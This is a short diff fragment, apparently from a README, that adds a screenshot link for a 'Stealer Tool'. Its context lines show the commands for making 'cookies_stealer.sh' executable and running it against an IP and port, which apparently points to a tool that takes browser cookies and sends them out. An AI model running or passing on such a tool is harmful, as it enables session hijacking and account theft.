@@ -17,3 +17,4 @@ chmod +x cookies_stealer.sh
 
 bash cookies_stealer.sh <IP> <PORT> 
 
+![Stealer Tool Screenshot](images/stealer_tool.png)
